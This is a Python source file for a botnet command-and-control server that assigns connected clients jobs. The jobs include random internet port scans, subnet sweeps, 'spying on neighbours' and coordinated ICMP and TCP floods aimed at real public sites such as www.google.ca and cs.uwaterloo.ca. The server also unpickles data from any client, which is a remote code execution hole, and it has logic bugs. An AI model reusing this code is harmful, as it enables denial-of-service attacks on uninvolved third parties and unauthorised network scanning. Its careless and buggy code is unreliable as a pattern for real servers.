import socket
import threading
import time
import pickle
import random
import struct
import math

PORT = 6000
SERVER = socket.gethostbyname(socket.gethostname())  # Get IP
ADDR = (SERVER, PORT)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creates server socket
clients = []
iplist = ["192.168.1.6", "www.google.ca", "docs.python.org", "www.minecraft.net", "cs.uwaterloo.ca"]
traceinfo = [[True, math.inf, None], [True, math.inf, None], [True, math.inf, None], [True, math.inf, None], [True, math.inf, None]]
subnets = ["192.168.1.1/24"]
multijobqueue = [0, 0]
threadList = []
selectedThreads = []
numOfBots = 0
jobQueue = 0
attackChoice = ""
TCPTarget = ['', 0]
ICMPTarget = ''

# --- Shared Messages ---

DISCONNECT = "disconnect"
JOB_REQUEST = "jobrequest"
JOB_REPORT = "jobreport"
JOB_COMPLETE = "completed"
JOB_INCOMPLETE = "incomplete"
JOB_ASSIGNMENT = "assignment"
JOB_SUCCESS = "success"
JOB_FAILURE = "failure"
COMPLETION_ACK = "goodjob"

# --- Port Binding ---

try:  # checks if port is being used
    server.bind(ADDR)
    print(f"Port :{PORT} bound successfully.")
except:
    print(f"Port :{PORT} is being used.")
    quit()


# --- Function Definitions ---

def send(conn, addr, v):
    print(f"\nSending the following message to client @ {addr}\n\t{v}\n")
    m = pickle.dumps(v)
    conn.send(m)


def ifsuccess(conn, addr, v):  # Checks if incoming client is reporting job success
    if v[1] == JOB_COMPLETE:  # Client reported success
        print(f"Client @ {addr} has completed their task", end="")
        if len(v) > 2:
            print(f" with the following return value:\n\t\"{v[2]}\"")

        if len(v) > 3:
            if v[3] == 5:   # Check if the client is reporting from job 5
                ip = v[4]
                index = iplist.index(ip)
                tracetime = v[5]
                if traceinfo[index][1] > tracetime:
                    traceinfo[index][2] = conn
                    traceinfo[index][1] = tracetime
                    print(f"\nClient @ {addr} is now the closest to host @ {ip} with a time of {tracetime} ms")
                traceinfo[index][0] = v[6]
                if v[6] is False:
                    print(f"The host @ {ip} is unreachable.")

        # Send completion acknowledgement
        send(conn, addr, [COMPLETION_ACK])
    elif v[1] == JOB_INCOMPLETE:
        print(f"Client @ {addr} has not completed their task")
        send(conn, addr, [COMPLETION_ACK])


def hire(conn, addr, v):  # Give job to a client
    job_num = random.randint(0, 6)  # int(input("Which job should the client do?: ")) - 1

    if job_num == 0:    # Ping host
        ip = random.choice(iplist)
        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, ip])
    elif job_num == 1:  # Check port status
        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
        port = random.randint(0, 65535)
        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, ip, port])
    elif job_num == 2:  # ICMP Flood
        global ICMPTarget
        multijobqueue[0] += 1
        if multijobqueue[0] == 1:
            # ensures that all jobseeker recieve the same target
            ICMPTarget = random.choice(iplist)
        while multijobqueue[0] < 2:
            time.sleep(0.5)
        # Allows for other jobseekers to join
        print(f"Waiting for more clients to connect.\n")
        time.sleep(5)
        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, ICMPTarget])
        multijobqueue[0] = 0
    elif job_num == 3:  # TCP Flood
        global TCPTarget
        multijobqueue[1] += 1
        if multijobqueue[1] == 1:
            TCPTarget[0] = random.choice(iplist)
            TCPTarget[1] = random.randint(0, 65535)
        while multijobqueue[1] < 2:
            time.sleep(0.5)
        # Allows for other jobseekers to join
        print(f"Waiting for more clients to connect.\n")
        time.sleep(5)
        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, TCPTarget[0], TCPTarget[1]])
        multijobqueue[1] = 0
    elif job_num == 4:      # Get live IP addresses
        subnet = random.choice(subnets)
        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, subnet])
    elif job_num == 5:  # Trace route
        reachable = False
        target = ""
        while not reachable:
            target = random.randint(0, len(iplist))
            reachable = traceinfo[target][0]

        send(conn, addr, [JOB_ASSIGNMENT, job_num + 1, iplist[target]])
    elif job_num == 6: # Spy on neighbours
        send(conn, addr, [JOB_ASSIGNMENT, job_num+1, addr])
    else:
        print("That is not a valid job number.")
        hire(conn, addr, v)


def connect_client(conn, addr):
    print(f"New connection established.")
    connected = True
    try:  # Check if client disconnected by not sending disconnect message
        while connected:
            m = conn.recv(2048)
            v = pickle.loads(m)
            print(f"Received the following message from the client @ {addr}:\n\t{v}\n")

            if v[0] == DISCONNECT:  # Client requested disconnect
                connected = False
                print(f"Client @ {addr} has requested disconnect.")
                handledisconnect(conn, addr)
                print(f"\tDisconnected.")
                print(f"{len(clients)} active connections.\n")

            elif v[0] == JOB_REQUEST:  # Client requested job
                print(f"Client @ {addr} is requesting a job")
                hire(conn, addr, v)

            elif v[0] == JOB_REPORT:  # Client is reporting job status
                print(f"Client @ {addr} is reporting back")
                ifsuccess(conn, addr, v)
    except:
        print(f"Client @ {addr} has disconnected on exception.")
        handledisconnect(conn, addr)
        print(f"{len(clients)} active connections.\n")


def handledisconnect(conn, addr):
    for x in traceinfo:
        if x[1] == conn:
            x[1] = None
            x[2] = math.inf

    conn.close()
    clients.remove(addr)


def start():
    server.listen()  # Listen for incoming connections
    print(f"Running on address {SERVER}:{PORT}")
    while True:
        conn, addr = server.accept()  # Server accepts the connection from the client
        clients.append(addr)

        # Create thread for each client, connect_client invoked by run() method
        thread = threading.Thread(target=connect_client, args=(conn, addr))
        thread.start()  # Start thread
        print(f"\n{len(clients)} active connections.")


# --- Start ---

print("Starting...")
for i in range(0):  # Just for fun
    time.sleep(1)
    print(".")
print("Started.")
start()
